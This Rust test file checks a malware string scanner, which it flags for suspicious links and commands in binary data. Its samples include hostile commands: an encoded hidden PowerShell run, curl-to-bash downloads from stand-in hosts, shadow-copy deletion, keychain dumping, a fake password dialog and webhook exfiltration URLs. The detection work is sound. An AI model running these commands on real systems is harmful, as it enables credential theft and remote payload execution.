// The checks of tests/str_scan_tests.cpp, ported one for one (all but the Mach-O sniffing, which the Windows app does not use).
// tests/daemon_diff.py then compares the whole daemon with the C++ engine on thousands of generated and real files.
use super::*;

fn ascii(s: &str) -> Vec<u8> {
    let mut b = s.as_bytes().to_vec();
    b.push(0);
    b
}
fn ascii_no_nul(s: &str) -> Vec<u8> {
    s.as_bytes().to_vec()
}
fn wide(s: &str) -> Vec<u8> {
    let mut b = Vec::new();
    for c in s.bytes() {
        b.push(c);
        b.push(0);
    }
    b.extend_from_slice(&[0, 0]);
    b
}
fn cat(parts: &[Vec<u8>]) -> Vec<u8> {
    parts.concat()
}
fn noise(n: usize, mut seed: u32) -> Vec<u8> {
    (0..n)
        .map(|_| {
            seed = seed.wrapping_mul(1103515245).wrapping_add(12345);
            (seed >> 16) as u8
        })
        .collect()
}
fn run(b: &[u8]) -> Report {
    scan(b)
}
fn run_s(s: &str) -> Report {
    run(&ascii(s))
}
fn has_text(r: &Report, t: &str, command: bool) -> bool {
    r.shown.iter().any(|f| f.text == t.as_bytes() && f.command == command)
}

#[test]
fn links() {
    let r = run(&cat(&[noise(300, 1), ascii("http://evil.example.com/payload.exe"), noise(300, 2)]));
    assert!(has_text(&r, "http://evil.example.com/payload.exe", false));
    assert!(r.links >= 1 && r.commands == 0);
    let r = run(&cat(&[noise(64, 3), wide("https://cdn.discordapp.com/attachments/1/2/x.exe"), noise(64, 4)])); // UTF-16LE
    assert!(has_text(&r, "https://cdn.discordapp.com/attachments/1/2/x.exe", false));
    assert!(r.shown[0].hot);
    let odd = cat(&[ascii_no_nul("X"), wide("http://odd.example.net/z")]); // wide string at an odd offset
    assert!(has_text(&run(&odd), "http://odd.example.net/z", false));
    assert!(has_text(&run_s("HTTP://EXAMPLE.COM/A"), "HTTP://EXAMPLE.COM/A", false)); // case kept
    assert!(has_text(&run_s("see http://example.com/a.exe."), "http://example.com/a.exe", false)); // sentence dot cut off
    assert!(has_text(&run_s("<a href='http://example.com/y'>x</a>"), "http://example.com/y", false));
    assert!(has_text(&run_s("\"http://example.com/x\""), "http://example.com/x", false));
    assert_eq!(run_s("http://a.example.com/1 http://b.example.com/2").links, 2);
    assert_eq!(run_s("ftp://files.example.org/x.zip").links, 1);
    assert_eq!(run_s("wss://c2.example.org:8443/ws").links, 1);
    // things that look like links and are not
    assert_eq!(run_s("http://%s:%d/api").links, 0);
    assert_eq!(run_s("https://").links, 0);
    assert_eq!(run_s("http://localhost:8080/x").links, 0);
    assert_eq!(run_s("http://127.0.0.1/x").links, 0);
    assert_eq!(run_s("http://schemas.microsoft.com/winfx/2006/xaml").links, 0);
    assert_eq!(run_s("http://www.w3.org/2000/svg").links, 0);
    assert_eq!(run_s("http://crl.microsoft.com/pki/crl/products/x.crl").links, 0);
    assert_eq!(run_s("http://syncrl.example.com/x").links, 1); // "crl." inside a longer host name is not a certificate host
    assert_eq!(run_s("ab://").links, 0);
    // the same link three times is one finding
    let r = run(&cat(&[ascii("http://dup.example.com/a"), noise(20, 5), ascii("http://dup.example.com/a"), ascii("http://dup.example.com/a")]));
    assert_eq!(r.links, 1);
    // very long link: cut, still marked
    let r = run_s(&format!("http://long.example.com/{}", "a".repeat(300)));
    assert!(r.shown.len() == 1 && r.shown[0].text.len() == MAX_TEXT && &r.shown[0].text[157..] == b"...");
}

#[test]
fn hot() {
    let r = run(&cat(&[ascii("http://aaa.example.org/x"), ascii("https://discord.com/api/webhooks/123/abc")]));
    assert!(r.shown.len() == 2 && r.shown[0].hot && find(&r.shown[0].text, b"webhooks", 0).is_some() && !r.shown[1].hot); // hot first
    assert!(run_s("https://pastebin.com/raw/abc123").shown[0].hot);
    assert!(run_s("https://api.telegram.org/bot123:abc/sendMessage").shown[0].hot);
    assert!(run_s("https://raw.githubusercontent.com/u/r/main/x.ps1").shown[0].hot);
    assert!(!run_s("https://example.org/x").shown[0].hot);
    assert!(!run_s("http://best.me/x").shown[0].hot); // "t.me/" inside "best.me/" is not t.me
    assert!(!run_s("http://orbit.ly/x").shown[0].hot);
}

#[test]
fn ip_port() {
    assert!(has_text(&run_s("connect 185.199.108.153:4444 now"), "185.199.108.153:4444", false));
    assert_eq!(run_s("10.0.0.1 is the gateway").links, 0); // no port: a version, a note
    assert_eq!(run_s("999.1.1.1:80").links, 0);
    assert_eq!(run_s("1.2.3.4:99999").links, 0);
    assert_eq!(run_s("1.2.3.4:0").links, 0);
    assert_eq!(run_s("127.0.0.1:8080").links, 0);
    assert_eq!(run_s("0.0.0.0:80").links, 0);
    assert_eq!(run_s("1.2.3.4.5:80").links, 0); // part of a longer dotted number
    assert_eq!(run_s("version 6.1.7601.17514").links, 0);
    assert!(has_text(&run_s("http://203.0.113.9:8080/a"), "http://203.0.113.9:8080/a", false)); // inside a URL: the URL
    assert_eq!(run_s("203.0.113.9:8080 and 198.51.100.7:31337").links, 2);
}

#[test]
fn commands() {
    assert!(has_text(&run_s("powershell -nop -w hidden -enc JABzAD0ATgBlAHcA"), "powershell -nop -w hidden -enc JABzAD0ATgBlAHcA", true));
    assert!(has_text(&run_s("PowerShell.exe -ExecutionPolicy Bypass -File x.ps1"), "PowerShell.exe -ExecutionPolicy Bypass -File x.ps1", true));
    let r = run_s("certutil -urlcache -f http://x.example.org/a.exe a.exe");
    assert!(r.commands == 1 && r.links == 1); // the command AND its link
    assert_eq!(run_s("schtasks /create /tn upd /tr c:\\x.exe").commands, 1);
    assert_eq!(run_s("vssadmin delete shadows /all /quiet").commands, 1);
    assert_eq!(run_s("bcdedit /set {default} recoveryenabled no").commands, 1);
    assert_eq!(run_s("Add-MpPreference -ExclusionPath C:\\Users").commands, 1);
    assert_eq!(run_s("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v x").commands, 1);
    assert_eq!(run(&wide("mshta http://x.example.org/a.hta")).commands, 1); // UTF-16 too
    // not commands
    assert_eq!(run_s("powershell").commands, 0);
    assert_eq!(run_s("cmd /c dir").commands, 0);
    assert!(run_s("hello world, this is a perfectly normal string").shown.is_empty());
    assert_eq!(run_s("certutil").commands, 0);
}

#[test]
fn shape() {
    assert!(scan(&[]).shown.is_empty());
    assert!(scan(&[0x41]).shown.is_empty());
    assert_eq!(run(&ascii("http")).links, 0); // shorter than a link
    assert!(run_s(&"A".repeat(5000)).shown.is_empty()); // one huge run: split, no loop
    // a run is handed over in pieces of MAX_RUN: a link at the start of a huge run is still found
    assert_eq!(run_s(&format!("http://start.example.com/p {}", "B".repeat(2000))).links, 1);
    let many: String = (0..100).map(|i| format!("http://h{}.example.com/x\n", i)).collect();
    let r = run(&cat(&[ascii(&many), ascii("schtasks /create /tn x")]));
    assert!(r.links == 100 && r.commands == 1 && r.shown.len() == MAX_LINKS + 1);
    assert!(r.shown.iter().any(|f| f.command)); // the command is not pushed out by the links
    let huge: String = (0..3000).map(|i| format!("http://h{}.example.com/\n", i)).collect();
    let r = run(&ascii(&huge));
    assert!(r.links <= MAX_CANDIDATES && r.links > 1000); // capped, not unbounded
    let r = run(&noise(1 << 20, 7));
    assert!(r.links < 20 && r.commands == 0); // random bytes: no crash, next to nothing
    assert!(run(&vec![0u8; 1 << 16]).shown.is_empty()); // all zero
}

#[test]
fn mac() {
    // the commands a Mac stealer / dropper is known for
    let t = "osascript -e 'display dialog \"Password:\" with hidden answer'";
    assert!(has_text(&run_s(t), t, true));
    assert_eq!(run_s("osascript -e 'do shell script \"id\" with administrator privileges'").commands, 1);
    assert_eq!(run_s("osascript -e 'do shell script \"touch /tmp/x\"'").commands, 1);
    let r = run_s("curl -fsSL http://x.example.org/i.sh | bash");
    assert!(r.commands == 1 && r.links == 1); // the command AND its link
    assert_eq!(run_s("curl -s http://x.example.org/i.sh | sh").commands, 1);
    assert_eq!(run_s("curl -s http://x.example.org/i.sh | zsh").commands, 1);
    assert_eq!(run_s("/bin/bash -c \"$(curl -fsSL http://x.example.org/i.sh)\"").commands, 1);
    assert_eq!(run_s("echo QUJDREVGRw== | base64 -D | bash").commands, 1);
    assert_eq!(run_s("echo QUJDREVGRw== | base64 --decode | zsh").commands, 1);
    assert_eq!(run_s("security find-generic-password -ga Chrome").commands, 1);
    assert_eq!(run_s("security find-internet-password -s example.org").commands, 1);
    assert_eq!(run_s("security dump-keychain -d login.keychain").commands, 1);
    assert_eq!(run_s("xattr -d com.apple.quarantine /tmp/x").commands, 1);
    assert_eq!(run_s("xattr -cr /Applications/Thing.app").commands, 1);
    assert_eq!(run_s("spctl --master-disable").commands, 1);
    assert_eq!(run_s("sqlite3 TCC.db \"INSERT INTO access VALUES(1)\"").commands, 1);
    assert_eq!(run_s("launchctl load -w ~/Library/LaunchAgents/com.example.x.plist").commands, 1);
    assert_eq!(run_s("launchctl bootstrap gui/501 x.plist").commands, 1);
    assert_eq!(run(&wide("osascript -e 'tell app \"System Events\" to display dialog \"x\" with hidden answer'")).commands, 1); // UTF-16 too
    // not commands
    assert_eq!(run_s("osascript").commands, 0);
    assert_eq!(run_s("osascript -e 'tell application \"Finder\" to activate'").commands, 0);
    assert_eq!(run_s("curl -s http://x.example.org/a.json | jq .").commands, 0);
    assert_eq!(run_s("security").commands, 0);
    assert_eq!(run_s("launchctl list").commands, 0);
    assert_eq!(run_s("xattr -l file").commands, 0);
    assert_eq!(run_s("base64 -d in.txt").commands, 0);
    assert_eq!(run_s("echo hi | bash").commands, 0); // no download, no decoding
    // what every signed Mac program carries is not a finding; a link to Apple's developer site is still a link
    assert_eq!(run_s("http://www.apple.com/DTDs/PropertyList-1.0.dtd").links, 0);
    assert_eq!(run_s("https://www.apple.com/appleca/").links, 0);
    assert_eq!(run_s("https://www.apple.com/certificateauthority/").links, 0);
    assert_eq!(run_s("http://ocsp.apple.com/ocsp03-wwdr01").links, 0);
    assert_eq!(run_s("http://crl.apple.com/root.crl").links, 0);
    assert_eq!(run_s("https://developer.apple.com/documentation/x").links, 1);
    // a Mach-O shaped buffer: header, load-command names, then the strings
    let mut macho = vec![0xCF, 0xFA, 0xED, 0xFE, 0x0C, 0x00, 0x00, 0x01];
    macho.resize(64, 0);
    let b = cat(&[macho, ascii("__TEXT"), ascii("__cstring"), ascii("https://discord.com/api/webhooks/1/abc"), noise(128, 9), ascii("osascript -e 'x' with hidden answer")]);
    let r = run(&b);
    assert!(r.links == 1 && r.commands == 1 && r.shown[0].hot);
}
